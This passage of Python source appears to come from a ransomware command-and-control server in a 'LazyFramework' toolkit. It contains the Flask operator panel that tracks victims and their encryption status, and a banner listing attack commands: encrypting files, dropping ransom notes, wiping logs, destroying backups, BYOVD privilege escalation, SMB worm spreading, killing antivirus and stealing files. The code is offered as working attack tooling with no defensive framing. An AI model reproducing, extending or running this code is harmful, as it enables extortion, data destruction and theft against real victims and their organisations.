                    if os.name == "nt":
                        os.startfile(self.exfil_dir)
                    elif sys.platform == "darwin":
                        subprocess.Popen(["open", self.exfil_dir])
                    else:
                        subprocess.Popen(["xdg-open", self.exfil_dir])
                    return jsonify({"success": True, "path": self.exfil_dir})
                except Exception as e:
                    return jsonify({"success": False, "error": str(e)})

            @app.route("/reset_encrypted/<client_id>", methods=["POST"])
            @login_required
            def reset_encrypted(client_id):
                with self.lock:
                    if client_id not in self.victims:
                        return jsonify({"success": False, "error": "Victim not found"})
                    victim = self.victims[client_id]
                    victim["encrypted"] = False
                    victim["encrypted_count"] = 0
                    victim["status"] = "decrypted"
                    victim["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.command_history.append(
                        {
                            "client_id": client_id,
                            "command": "reset_encrypted (manual)",
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "status": "success",
                        }
                    )
                    print(f"[+] Manual reset encrypted status: {client_id}")
                    return jsonify(
                        {"success": True, "message": "Status reset to decrypted"}
                    )

            @app.route("/remove/<client_id>", methods=["POST"])
            @login_required
            def remove_victim_route(client_id):
                if self.remove_victim(client_id):
                    return jsonify({"success": True, "message": "Removed"})
                return jsonify({"success": False, "message": "Not found"})

            @app.route("/kill_server", methods=["POST"])
            @login_required
            def kill_server():
                self.running = False
                return jsonify({"success": True, "message": "Server shutting down"})

            print("")
            print("=" * 60)
            print("WEB PANEL")
            print("=" * 60)
            print(f"  URL:      http://{self.host}:{self.web_port}")
            print(f"  Username: {_ADMIN_USERNAME}")
            print(f"  Password: {self.password}")
            print(f"  Session:  1 hour timeout")
            print(
                f"  Lockout:  {_MAX_ATTEMPTS} failed attempts → {_LOCKOUT_DURATION}s lock"
            )
            print("=" * 60)
            print("")

            if self.host in ("127.0.0.1", "localhost"):
                try:
                    import webbrowser

                    webbrowser.open(f"http://127.0.0.1:{self.web_port}")
                except Exception:
                    pass

            app.run(
                host=self.host,
                port=self.web_port,
                debug=False,
                use_reloader=False,
                threaded=True,
            )

        except ImportError as e:
            print(f"[!] Flask not installed: {e}")
            print("[!] Install with: pip install flask")
            print("[!] Web panel disabled — C2 TCP still works")
        except Exception as e:
            print(f"[!] Web panel error: {e}")
            import traceback

            traceback.print_exc()

    def stop(self):
        print("[*] Stopping C2 Server...")
        self.running = False
        with self.lock:
            for client_id, victim in self.victims.items():
                try:
                    sock = victim.get("socket")
                    if sock:
                        sock.close()
                except Exception:
                    pass
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        print("[*] C2 Server stopped")


# ==================== RUN ====================


def run(session, options):
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    web_port = int(options.get("WEB_PORT", 5000))
    username = options.get("C2_USERNAME", "admin")
    password = options.get("C2_PASSWORD", "admin")

    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║   LAZYFRAMEWORK C2 SERVER v6.3 (HYBRID + AUTH + POST-EXPLOIT)    ║
║  Ransomware + RSA Key + AV Killer + BYOVD + SMB + Exfil + Creds  ║
╠══════════════════════════════════════════════════════════════════╣
║  LHOST       : {lhost}
║  LPORT       : {lport}
║  WEB_PORT    : {web_port}
║  USERNAME    : {username}
║  PASSWORD    : {password}
║                                                                 ║
║  Commands:                                                      ║
║  ─────────────────────────────────────────────                  ║
║  encrypt        : Encrypt files (auto-run post-exploit first)   ║
║  decrypt        : Decrypt files (hybrid: denied)                ║
║  status         : Get victim status                             ║
║  ping           : Check if victim alive                         ║
║  wallpaper      : Change victim wallpaper                       ║
║  note           : Drop ransom note                              ║
║  wipe_logs      : Wipe forensic artifacts                       ║
║  anti_recovery  : Destroy VSS/backups/recovery                  ║
║  byovd          : Trigger BYOVD privilege escalation            ║
║  spread         : Trigger SMB worm propagation                  ║
║  av_kill        : Trigger AV/EDR killer                         ║
║  exfiltrate     : Steal files from victim                       ║
║  show_gui       : Show ransom GUI on-demand                     ║
║  decrypt_gui    : Show standalone decrypt tool                  ║
║  kill           : Self-destruct victim                          ║
║                                                                 ║
║  Web Panel: http://127.0.0.1:{web_port}                         ║
╚══════════════════════════════════════════════════════════════════╝
""")

    server = C2Server(lhost, lport, web_port, password, username)

    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        server.stop()

    return "C2 Server stopped"
